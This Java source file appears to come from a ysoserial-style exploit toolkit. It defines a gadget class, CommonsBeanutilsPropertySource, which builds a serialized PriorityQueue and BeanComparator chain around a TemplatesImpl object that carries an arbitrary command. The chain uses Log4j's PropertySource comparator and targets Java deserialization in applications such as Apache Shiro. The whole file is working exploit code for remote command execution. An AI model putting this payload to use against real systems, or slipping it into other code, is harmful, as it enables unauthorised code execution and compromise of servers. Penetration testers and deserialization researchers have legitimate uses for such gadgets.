package A.R.ysogate.payloads.gadgets;

import A.R.ysogate.payloads.utils.PayloadRunner;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.logging.log4j.util.PropertySource;
import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Authors;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.utils.Gadgets;
import A.R.ysogate.payloads.utils.Reflections;

import java.util.PriorityQueue;

/**
 * 从 https://github.com/SummerSec/ShiroAttack2/ 中抄来的链子
 *
 * @author su18
 */
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "org.apache.logging.log4j:log4j-core:2.17.1"})
@Authors({"SummerSec"})
public class CommonsBeanutilsPropertySource implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {

		final Object template = Gadgets.createTemplatesImpl(command);
		PropertySource propertySource1 = new PropertySource() {
			@Override
			public int getPriority() {
				return 0;
			}
		};

		BeanComparator beanComparator = new BeanComparator(null, new PropertySource.Comparator());

		PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);

		queue.add(propertySource1);
		queue.add(propertySource1);

		Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
		Reflections.setFieldValue(beanComparator, "property", "outputProperties");

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutilsPropertySource.class, args);
	}
}
